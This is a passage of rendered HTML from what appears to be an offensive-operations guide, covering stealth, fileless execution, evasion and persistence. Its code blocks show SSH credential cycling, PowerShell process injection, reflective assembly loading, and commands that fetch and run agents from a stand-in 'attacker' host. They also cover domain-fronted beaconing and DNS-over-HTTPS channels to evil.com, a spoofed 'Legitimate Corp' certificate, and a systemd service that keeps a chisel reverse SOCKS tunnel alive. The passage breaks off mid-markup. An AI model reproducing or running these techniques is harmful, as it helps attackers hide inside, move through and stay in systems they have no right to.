<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Credential rotation script</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)">#!/bin/bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">CREDS</span><span class="token operator">=</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;user1:pass1&quot;</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;user2:pass2&quot;</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;user3:pass3&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">CURRENT_CRED</span><span class="token operator">=</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">${CREDS</span><span class="token variable punctuation" style="color:rgb(248, 248, 242);font-style:italic">[</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$RANDOM </span><span class="token variable operator" style="color:rgb(189, 147, 249);font-style:italic">%</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic"> ${</span><span class="token variable operator" style="color:rgb(189, 147, 249);font-style:italic">#</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">CREDS</span><span class="token variable punctuation" style="color:rgb(248, 248, 242);font-style:italic">[</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">@</span><span class="token variable punctuation" style="color:rgb(248, 248, 242);font-style:italic">]</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">}</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Use credential for connection</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-o</span><span class="token plain"> </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">PasswordAuthentication</span><span class="token operator">=</span><span class="token plain">yes </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">${CURRENT_CRED</span><span class="token variable operator" style="color:rgb(189, 147, 249);font-style:italic">%</span><span class="token variable operator" style="color:rgb(189, 147, 249);font-style:italic">:</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">*}</span><span class="token plain">@target_host</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="session-timing-patterns">Session Timing Patterns:<a href="#session-timing-patterns" class="hash-link" aria-label="Direct link to Session Timing Patterns:" title="Direct link to Session Timing Patterns:" translate="no">‚Äã</a></h4>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> datetime</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">is_business_hours</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    now </span><span class="token operator">=</span><span class="token plain"> datetime</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">datetime</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">now</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">now</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">weekday</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&lt;</span><span class="token plain"> </span><span class="token number">5</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">and</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token number">9</span><span class="token plain"> </span><span class="token operator">&lt;=</span><span class="token plain"> now</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">hour </span><span class="token operator">&lt;=</span><span class="token plain"> </span><span class="token number">17</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">wait_for_business_hours</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">while</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">not</span><span class="token plain"> is_business_hours</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        time</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">sleep</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">3600</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">  </span><span class="token comment" style="color:rgb(98, 114, 164)"># Check every hour</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="process-injection-for-stealth">Process Injection for Stealth:<a href="#process-injection-for-stealth" class="hash-link" aria-label="Direct link to Process Injection for Stealth:" title="Direct link to Process Injection for Stealth:" translate="no">‚Äã</a></h4>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"># PowerShell process injection</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$code = @&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[DllImport(&quot;kernel32.dll&quot;)]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&quot;@</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Add-Type -MemberDefinition $code -Name Win32 -Namespace Win32Functions</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="143-memory-only-operations">14.3 Memory-Only Operations<a href="#143-memory-only-operations" class="hash-link" aria-label="Direct link to 14.3 Memory-Only Operations" title="Direct link to 14.3 Memory-Only Operations" translate="no">‚Äã</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="fileless-agent-deployment">Fileless Agent Deployment:<a href="#fileless-agent-deployment" class="hash-link" aria-label="Direct link to Fileless Agent Deployment:" title="Direct link to Fileless Agent Deployment:" translate="no">‚Äã</a></h4>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Linux memory execution</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">curl</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-s</span><span class="token plain"> http://attacker/agent </span><span class="token operator">|</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># PowerShell reflective loading</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$bytes</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">System.Convert</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain">::FromBase64String</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$agent_b64</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$assembly</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">System.Reflection.Assembly</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain">::Load</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$bytes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$assembly</span><span class="token plain">.EntryPoint.Invoke</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$null</span><span class="token plain">, @</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">,</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$args</span><span class="token punctuation" style="color:rgb(248, 248, 242)">))</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Python bytecode execution</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exec</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">compile</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">requests.get</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;http://attacker/agent.py&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.text, </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;&lt;string&gt;&#x27;</span><span class="token plain">, </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;exec&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">))</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="in-memory-tunneling">In-Memory Tunneling:<a href="#in-memory-tunneling" class="hash-link" aria-label="Direct link to In-Memory Tunneling:" title="Direct link to In-Memory Tunneling:" translate="no">‚Äã</a></h4>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">// C implementation for memory-resident tunneling</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token macro property directive-hash">#</span><span class="token macro property directive keyword" style="color:rgb(189, 147, 249);font-style:italic">include</span><span class="token macro property"> </span><span class="token macro property string" style="color:rgb(255, 121, 198)">&lt;windows.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token macro property directive-hash">#</span><span class="token macro property directive keyword" style="color:rgb(189, 147, 249);font-style:italic">include</span><span class="token macro property"> </span><span class="token macro property string" style="color:rgb(255, 121, 198)">&lt;winsock2.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DWORD WINAPI </span><span class="token function" style="color:rgb(80, 250, 123)">TunnelThread</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">LPVOID lpParam</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">// Socket creation and traffic relay in memory</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    SOCKET sock </span><span class="token operator">=</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">socket</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">AF_INET</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> SOCK_STREAM</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">// Implementation details...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">int</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">main</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">CreateThread</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token constant" style="color:rgb(189, 147, 249)">NULL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> TunnelThread</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token constant" style="color:rgb(189, 147, 249)">NULL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token constant" style="color:rgb(189, 147, 249)">NULL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="144-advanced-evasion-techniques">14.4 Advanced Evasion Techniques<a href="#144-advanced-evasion-techniques" class="hash-link" aria-label="Direct link to 14.4 Advanced Evasion Techniques" title="Direct link to 14.4 Advanced Evasion Techniques" translate="no">‚Äã</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="domain-fronting">Domain Fronting:<a href="#domain-fronting" class="hash-link" aria-label="Direct link to Domain Fronting:" title="Direct link to Domain Fronting:" translate="no">‚Äã</a></h4>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Use legitimate CDN for traffic fronting</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">curl</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-H</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;Host: evil.com&quot;</span><span class="token plain"> https://legitimate-cdn.cloudfront.net/beacon</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># DNS over HTTPS for covert communication</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">curl</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-H</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;Accept: application/dns-json&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;https://cloudflare-dns.com/dns-query?name=data.evil.com&amp;type=TXT&quot;</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="steganographic-tunneling">Steganographic Tunneling:<a href="#steganographic-tunneling" class="hash-link" aria-label="Direct link to Steganographic Tunneling:" title="Direct link to Steganographic Tunneling:" translate="no">‚Äã</a></h4>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Hide data in HTTP headers</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">headers </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;User-Agent&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;Mozilla/5.0&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;X-Forwarded-For&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> base64_encode</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">command</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;Accept-Language&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> encrypt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="certificate-pinning-bypass">Certificate Pinning Bypass:<a href="#certificate-pinning-bypass" class="hash-link" aria-label="Direct link to Certificate Pinning Bypass:" title="Direct link to Certificate Pinning Bypass:" translate="no">‚Äã</a></h4>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Custom certificate generation</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">openssl req </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-x509</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-newkey</span><span class="token plain"> rsa:2048 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-keyout</span><span class="token plain"> key.pem </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-out</span><span class="token plain"> cert.pem </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-days</span><span class="token plain"> </span><span class="token number">365</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-subj</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;/C=US/ST=CA/L=San Francisco/O=Legitimate Corp/CN=*.legitimate.com&quot;</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="15-platform-specific-implementation-considerations">15. Platform-Specific Implementation Considerations<a href="#15-platform-specific-implementation-considerations" class="hash-link" aria-label="Direct link to 15. Platform-Specific Implementation Considerations" title="Direct link to 15. Platform-Specific Implementation Considerations" translate="no">‚Äã</a></h2>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</div><div class="admonitionContent_BuS1"><p>Adapt scripts, service definitions, and persistence mechanisms to your platform (Linux, Windows, container, or cloud). Substitute example IPs, file paths, and user names as required.</p></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="151-linux-specific-techniques">15.1 Linux-Specific Techniques<a href="#151-linux-specific-techniques" class="hash-link" aria-label="Direct link to 15.1 Linux-Specific Techniques" title="Direct link to 15.1 Linux-Specific Techniques" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># iptables-based port forwarding</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">iptables </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-t</span><span class="token plain"> nat </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-A</span><span class="token plain"> PREROUTING </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-p</span><span class="token plain"> tcp </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--dport</span><span class="token plain"> </span><span class="token number">8080</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-j</span><span class="token plain"> DNAT --to-destination </span><span class="token number">192.168</span><span class="token plain">.1.100:80</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">iptables </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-t</span><span class="token plain"> nat </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-A</span><span class="token plain"> POSTROUTING </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-j</span><span class="token plain"> MASQUERADE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># systemd service for persistence</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">cat</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> /etc/systemd/system/tunnel.service </span><span class="token operator">&lt;&lt;</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">EOF</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">[Unit]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">Description=Network Tunnel Service</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">After=network.target</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">[Service]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">Type=simple</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">ExecStart=/usr/local/bin/chisel client server:8080 R:socks</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">Restart=always</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">User=nobody</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">[Install]</span><br></span><span class="token-line" 